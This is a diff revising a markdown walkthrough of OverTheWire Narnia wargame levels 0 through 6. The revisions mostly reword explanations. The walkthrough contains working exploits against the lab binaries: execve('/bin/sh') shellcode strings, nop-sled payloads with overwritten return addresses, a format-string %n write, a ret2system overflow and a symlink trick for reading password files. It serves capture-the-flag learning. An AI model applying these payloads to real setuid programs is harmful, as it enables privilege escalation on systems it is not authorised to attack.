@@ -75,7 +75,7 @@ int main(){
 ```
 
 based on the above file we know that `if val == 0xdeadbeef` , we get suid with bash shell , that's the way.
-by analysis on c file , `buf` variable is user manipulative by `scanf()` , but its also format specifier with `%24s` (24 Bytes) and actual `buf` declared with 20 Bytes
+by analysis on c file , `buf` variable is user manipulative by `scanf()` , but and its also have format specifier with `%24s` (24 Bytes) and actual `buf` declared with 20 Bytes
 
 ```
 narnia0@gibson:/narnia$ ./narnia0 
@@ -86,12 +86,12 @@ val: 0x42424242
 WAY OFF!!!!
 ```
 
-we executed the file , and gave bunch of "BBBBBBBBBBBBBBBBBBBBB" but as the result `val` has changed from `0x41414141` to `0x42424242` because in ASCII `B` refers has `42` , this showed there is a buffer overflow look at below image , it's in a stack structure that's the reason.
+we executed the file , and gave bunch of "BBBBBBBBBBBBBBBBBBBBB" but as the result `val` has changed from `0x41414141` to `0x42424242` because in ASCII `B` refers has `42` , this showed there is a bufferoverflow look at below image , it's in a stack structure that's the reason for this kind of behavivor.
 
 <img src="img/Pasted image 20240716215301.png" alt="Example Image" width="600"/>
 <img src="img/Pasted image 20240716224334.png" alt="Example Image" width="400"/>
 
-Let use GDB Debugger for analyzing c code 
+Let use GDB Debugger for analyzing c code in instruction level
 
 ```
 gdb ./narnia0
@@ -150,7 +150,7 @@ nable debuginfod for this session? (y or [n]) y
 End of assembler dump.
 ```
 
-we assign a breakpoint after `scanf` , for analyzing 
+we assign a breakpoint after `scanf` exactly at `*main+54`  , for analyzing purpose
 
 ```
 (gdb) break *main+54
@@ -169,21 +169,21 @@ Breakpoint 1, 0x080491fc in main ()
 0xffffd3b4:	0x080490dd	0x00000001	0xffffd454	0xf7fade34
 ```
 
-BBBB occupied as `0x42424242` in memory 
+BBBB occupied as `0x42424242` in memory , you can those things on above image
 
 <img src="img/Pasted image 20240716221119.png" alt="Example Image" width="1080"/>
 
-for `BBBBBBBBBBBBBBBBBBBB` it occupied, its declared space , let push furthermore adding more `BBBB`
+for these much `BBBBBBBBBBBBBBBBBBBB` it occupied like this but its declared 20 mem space , let push furthermore adding more `BBBB`
  
 <img src="img/Pasted image 20240716221418.png" alt="Example Image" width="1080"/>
 
-Buffer overflow happened `BBBBBBBBBBBBBBBBBBBBBBBB` and overwritten `$val` with `0x42424242`
+Buffer overflow happened at `BBBBBBBBBBBBBBBBBBBBBBBB` and overwritten `$val` with `0x42424242`
 
-<img src="img/Pasted image 20240716221615.png" alt="Example Image" width="1080"/>we added `ABCD` at the end of `BBBBBBBBBBBBBBBBBBBB` , see that  `41,42,43,44` ascii for `A,B,C,D`
+<img src="img/Pasted image 20240716221615.png" alt="Example Image" width="1080"/>we added `ABCD` at the end of `BBBBBBBBBBBBBBBBBBBB` , see that  `41,42,43,44` are ascii for `A,B,C,D` respectively
 
 <img src="img/Pasted image 20240716221943.png" alt="Example Image" width="1080"/>
 
-It follows little endian format that the reason `44,43,42,41` we can't able to use hex as std input so exit from gdb,  use `printf` for hex value , its will preprocess it.
+It follows little endian format that the reason `44,43,42,41` are in reverse order we can't able to use hex as std input , exit from gdb,  use `printf` for hex value , its will preprocess it and use pipe operator
 
 ```
 narnia0@gibson:/narnia$ printf "BBBBBBBBBBBBBBBBBBBBBBBB" | ./narnia0 
@@ -200,7 +200,7 @@ Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ�
 val: 0xdeadbeef
 ```
 
-  `val` has successfully changed into `0xdeadbeef` but bash not working because the input stream closed.
+  `val` has successfully changed into `0xdeadbeef` but bash not established or working because the input stream closed.
   
 <img src="img/Pasted image 20240716223157.png" alt="Example Image" width="400"/>
 
@@ -244,7 +244,7 @@ int main(){
 }
 ```
 
-this program , checks`getenv("EGG")` if its is `null` then control flow exit from program  , so `EGG` has to be something in order to not exiting from exe. 
+this program , checks `getenv("EGG")` if its is `null` then control flow exit from program  , so `EGG` has to be something in order to not exiting from exe. 
 `ret` - **The system function RET( program-name ) may be used to receive the return code from a non-Natural program called via a CALL statement** . if we give `/bin/bash` to egg env , we probably get shell because it execute that variable
 
 ```bash
@@ -290,7 +290,7 @@ narnia1@gibson:/narnia$ gdb ./narnia1
    0x080491d9 <+83>:	ret
 ```
 
-set breakpoint before that callback function , 
+set breakpoint at `*main+75` before that callback function , 
 
 ```
 (gdb) break *main+75
@@ -325,7 +325,7 @@ Linux gibson 6.8.0-1009-aws #9-Ubuntu SMP Fri May 17 14:39:23 UTC 2024 x86_64 x8
 
 https://shell-storm.org/shellcode/index.html , this is a shellcode database for all kind of architecture.
 
-https://shell-storm.org/shellcode/files/shellcode-585.html ,  this is shellcode refer just `bin/sh`
+https://shell-storm.org/shellcode/files/shellcode-585.html ,  this is shellcode refers just `bin/sh`
 
 ```
 \xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
@@ -339,7 +339,7 @@ narnia1
 $ 
 ```
 
-this shellcode just refer `bin/sh` , it is not maintain effective `uid` `gid` , instead it reset those privilege to current user
+As i already said that , this shellcode just refers `bin/sh` , it is not maintain effective `uid` `gid` , instead it reset those privilege to current user
 
 `bash -p`  -p  Turned on whenever the real and effective user ids do not match.
             Disables processing of the $ENV file and importing of shell
@@ -365,7 +365,7 @@ but its segment into multiple string
  "\x51\x53\x89\xe1\xcd\x80"'` ./narnia1
 ```
 
-`.` refer concatenate in  `perl` 
+`.` refer concatenate in  `perl` , this concatenate all segments into single string
 
 <img src="img/Pasted image 20240717113927.png" alt="Example Image" width="1080"/>
 
@@ -453,7 +453,6 @@ narnia2 got segf at 132
 Let see what happen at 132 characters 
 
 ```
-narnia2@gibson:/tmp/tmp.GE7d6wVNgB$ cd /narnia/
 narnia2@gibson:/narnia$ gdb ./narnia2
 (gdb) r $(python3 -c "print(132*'B')")
 ```
@@ -497,7 +496,7 @@ examine `-` refers last 20 word before `esp` pointer
 ```
 
 ```
-(gdb) set disassembly-flavor intel 
+(gdb) set disassembly-flavor intel # this personal preference
 (gdb) disassemble main
 ```
 
@@ -555,7 +554,7 @@ Breakpoint 1, 0x080491d8 in main ()
 0xffffd2ac:	0x42424242	0x42424242	0x42424242	0x00424242
 ```
 
-you can choose which ever word size the point is to find the those input characters hex values
+you can choose which ever word size the point is to find the those input characters hex values in memory
 
 ```
 #examining $esp
@@ -574,7 +573,7 @@ Program received signal SIGSEGV, Segmentation fault.
 # we could overwrite that return address , and before add some exploit before that return address let search some shellcode in order to exploit
 ```
 
-add additional 4 char after `nop` values  (NO OPERATION) this refers dummy padding values
+add additional 4 char after kind of `nop` values  (NO OPERATION) this refers dummy padding values
 
 ```
 (gdb) r $(python3 -c "print(132*'B'+'AAAA')")
@@ -589,7 +588,7 @@ Breakpoint 1, 0x080491d8 in main ()
 (gdb)
 ```
 
-again examine 140 bytes before `$esp` 
+again examine 140 bytes `b` before `$esp` , `-` refers backwardss
 
 ```
 Breakpoint 1, 0x080491d8 in main ()
@@ -617,12 +616,12 @@ Breakpoint 1, 0x080491d8 in main ()
 as we know that `buff` starts `0xffffd238`, you can able to look that on left side of  output
 
 ```
-# we have to give shellcode + nohup (132-25) * 'A' + known return address 
+# we have to give shellcode + nop (132-25) * 'A' + known return address 
 ```
 
 https://shell-storm.org/shellcode/files/shellcode-585.html
 
- 25 bytes execve("/bin/sh") shellcode that why (132-25) is used 
+ 25 bytes execve("/bin/sh") shellcode we have to subtract those value that why (132-25) is mentioned 
 
 ```
 \xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
@@ -638,7 +637,7 @@ Breakpoint 1, 0x080491d8 in main ()
 r $(python3 -c "print( '\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' + (132-25) * 'A' + '\x38\xd2\xff\xff' )")
 ```
 
-exploit not working , check below  let analyze further more 
+exploit not working , check below images let's analyze further more 
 
 ```
 Starting program: /narnia/narnia2 $(python3 -c "print( '\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' + (132-25) * 'A' + '\x38\xd2\xff\xff' )")
@@ -659,7 +658,7 @@ again give payload and analyze `250wx`  , it was confusing there are some many `
 
 <img src="img/Pasted image 20240719200158.png" alt="Example Image" width="450"/>
 
-Let using default echo and actual hex values , because `A` is confuse to analyze and change the payload order
+Let using default echo and actual hex values , because `A` is confuse us to analyze and change the payload structure, use `\x90` is Null actual nop value
 
 ```
 # NOP CODE + SHELLCODE + POINTER
@@ -667,7 +666,7 @@ Let using default echo and actual hex values , because `A` is confuse to analyze
 # Pointer Size = 4 and inital value was dummy 
 ```
 
-Found a shellcode code which flag of `-p` 
+Found a shellcode code which has of `-p` 
 `bash -p`  -p  Turned on whenever the real and effective user ids do not match.
             Disables processing of the $ENV file and importing of shell
             functions.  Turning this option off causes the effective uid and
@@ -696,6 +695,7 @@ Title: 	Linux x86 - polymorphic execve("/bin/bash", ["/bin/bash", "-p"], NULL) -
 
 Exploit Structure
 '\x90' * (132-57) + Shellcode + Dummy Pointer with size of 4 (\x38\xd2\xff\xff)
+Because we don't know the actaul pointer, which points memomry chunk before shellcode
 ```
 
 <img src="img/Pasted image 20240719201528.png" alt="Example Image" width="1080"/>
@@ -710,11 +710,11 @@ Copy this
 run `echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81\x38\xd2\xff\xff"`
 ```
 
-Don't give continue , analyze `250wx` `x/250wx $esp` , note from the last page , skip initial 
+Don't give continue , analyze `250wx` `x/250wx $esp` , note from the last page , skip initial have some few `\x90` 
 
 <img src="img/Pasted image 20240719202000.png" alt="Example Image" width="1080"/>
 
-Note the pointer end of `nop` , `0xffffd538` change the pointer in previous exploit 
+Note the pointer at end of `nop` , change `0xffffd538` the pointer in previous exploit 
 
 ```
 run `echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81\x38\xd5\xff\xff"`
@@ -723,7 +723,7 @@ run `echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x
 BOOM !!! We got the shell  
 
 <img src="img/Pasted image 20240719202317.png" alt="Example Image" width="1080"/>
-It worked but the user is still  `narnia2` , can't able to get next level password and we used -p flag there is no use of that. `exit` gdb let try outside gdb 
+It worked but the user is still  `narnia2` , can't able to get next level password and we used -p flag there is no use of that. `exit` gdb. let's try outside gdb might work or not 
 
 ```
 narnia2@gibson:/narnia$ /narnia2 `echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81\x38\xd5\xff\xff"`
@@ -791,7 +791,7 @@ int main(int argc, char **argv){
 }
 ```
 
-The `narnia3` take file as a argument , and copy it's content deliver it into BLACKHOLE `/dev/null`.
+The `narnia3` take file as a argument , and copy it's content deliver it into BLACKHOLE in the linux system called `/dev/null`.
 
 ```c
 int  ifd,  ofd;
@@ -815,7 +815,7 @@ narnia3@gibson:/tmp$
 ```
 
 ```
-() - bracket denotes size
+(5) - brackets denotes size
 /tmp/ (5) + "*" * 27 + /tmp
 # the last char "/tmp" will BufferOverFlow
 ```
@@ -827,11 +827,11 @@ narnia3@gibson:/tmp$ $d
 narnia3@gibson:/tmp$ echo $d
 /tmp/***************************/tmp
 
-# Make those folder with -p flag denotes parent dir
+# Make those folder with -p flag denotes parent in dir commmand which means it creates every folders for mentioned path if not existing 
 
 narnia3@gibson:/tmp$ mkdir -p $d
 
-# Make soft link or symbolic link with next flag to current pwd
+# Make soft link or symbolic link with next flag to current pwd with file
 narnia3@gibson:/tmp$ ln -s /etc/narnia_pass/narnia4 $d/get
 
 # we haven't create get file so make one and gave perm for all users
@@ -882,7 +882,7 @@ int main(int argc,char **argv){
 }
 ```
 
-buffer had the size of `256`  , if an argument is provided that string copy into buffer let's go to `gdb`
+buffer had the size of `256`  , if an argument is provided that string copy into buffer, let's go to `gdb`
 
 ```
 (gdb) r $(python3 -c "print('A'*256 + 'BBBB')")
@@ -930,13 +930,13 @@ Shellcode by Jonathan Salwan (57 bytes)
 
 <img src="img/Pasted image 20240719201528.png" alt="Example Image" width="1080"/>
 
-https://wordcounter.net/ use this site to  form nop 
+https://wordcounter.net/ use this site to form nop with exact count
 
 ```
 r `echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81\x60\xd6\xff\xff"`
 ```
 
-let's find the actual pointer and change.
+let's find the actual pointer and change the previous one.
 
 <img src="img/Pasted image 20240720215715.png" alt="Example Image" width="1080"/>
 
@@ -952,7 +952,7 @@ r `echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
 We got the shell as user narnia4 and let try outside gdb , copy this 
 
 ```
-`echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81\xe0\xd4\xff\xff"`
+`./narnia4 echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81\xe0\xd4\xff\xff"`
 ```
 
 <img src="img/Pasted image 20240720220219.png" alt="Example Image" width="1080"/>
@@ -997,7 +997,7 @@ int main(int argc, char **argv){
 }
 ```
 
-After See the C file `if i==500` , then we get a shell that's the point , buffer has size of `64` ,  input is taken as argument and stored to buffer using `snprintf()` , it has format string vulnerability as we have input into function. and buffer last char replace by `0` , let experiment with input 
+After Seen C file `if i==500` , then we get a shell that's the point , buffer has size of `64` ,  input is taken as argument and stored to buffer using `snprintf()` , it has format string vulnerability as we have input into function. and buffer last char replace by `0` , let's experiment with input 
 
 ```
 narnia5@gibson:/narnia$ ./narnia5 $(echo -e "AAAAAAA")
@@ -1021,11 +1021,11 @@ Change i's value from 1 -> 500. No way...let me give you a hint!
 buffer : [���`            60d3ffff] (24)
 i = 1 (0xffffd360)
 
-# this happen %n can't define argument inside "string" 
+# this happen %n can't define argument inside "string" because there are more.
 narnia5@gibson:/narnia$ ./narnia5 $(echo -e "\x60\xd3\xff\xff")%20x%n
 Segmentation fault (core dumped)
 
-# it worked but ponter value not increament beacuase $ is has to be escaped
+# it worked but pointer value not increment beacuase $ is has to be escaped because it is shell variable
 narnia5@gibson:/narnia$ ./narnia5 $(echo -e "\x60\xd3\xff\xff"")%20x%1$n
 Change i's value from 1 -> 500. No way...let me give you a hint!
 buffer : [���`            60d3ffff] (24)
@@ -1097,7 +1097,7 @@ int main(int argc, char *argv[]){
 
 ```
 
-The program checking for at most three arguments, and storing `arg[1] arg[2]` in b1 and b2 respectively using `strcpy()` and in that function there is no limit for argument  , and `fp()` is just a print function with file pointer.  and  printing only b1 . b1 and b2 are size `8`
+The program checking for at most three arguments, and storing `arg[1] arg[2]` in b1 and b2 respectively using `strcpy()` and in that function there is no limit for argument  , and `fp()` is just a print function with file pointer.  and  printing only b1 . b1 and b2 has  size of `8` bytes
 
 ```c
 unsigned long get_sp(void) {
@@ -1199,7 +1199,7 @@ k7             0x0                 0
 0xffffd328:     0x41414141      0x08049000      0x00000003      0xf7fade34
 0xffffd338:     0x00000000      0xf7da1cb9
 
-# A and B separated by null 00 , and then eax was store before A in the stack , lets overwrite that pointer
+# A and B separated by null 00 at the end of 0x41414100, and then eax was stores before A in the stack , let's overwrite that pointer
 (gdb) run "AAAAAAAACCCC" "BBBBBBBB"
 The program being debugged has been started already.
 Start it from the beginning? (y or n) Y
@@ -1236,7 +1236,7 @@ k6             0x0                 0
 k7             0x0                 0
 ```
 
-`$eax` was overwritten by `0x43434343`
+see `$eax` was overwritten by `0x43434343`
 
 ```
 # show the where system() pointer address in mem
@@ -1258,11 +1258,11 @@ Continuing.
 [Detaching after vfork from child process 3406718]
 [Inferior 1 (process 3406708) exited with code 01]
 
-# see child process has been created and detached so increase size , its working 
+# see child process has been created and detached so increase size , it might work
 run  `echo -e "AAAAAAAA\x30\xd4\xdc\xf7" "BBBBBBBBC"`
 sh: 1: C: not found
 
-# instead c use shell cmds for verfication
+# instead c use shell cmds for verfication whether it's really working
 run  `echo -e "AAAAAAAA\x30\xd4\xdc\xf7" "BBBBBBBBls"`
 [Detaching after vfork from child process 3409451]
 narnia0    narnia1    narnia2    narnia3    narnia4    narnia5    narnia6    narnia7    narnia8
@@ -1274,7 +1274,7 @@ narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  nar
 
 <img src="img/Pasted image 20240721144941.png" alt="Example Image" width="1080"/>
 
-Exit from debugger and try same 
+Exit from debugger and try outside gdb 
 
 ```
 ./narnia6 `echo -e "AAAAAAAA\x30\xd4\xdc\xf7" "BBBBBBBB/bin/sh"`
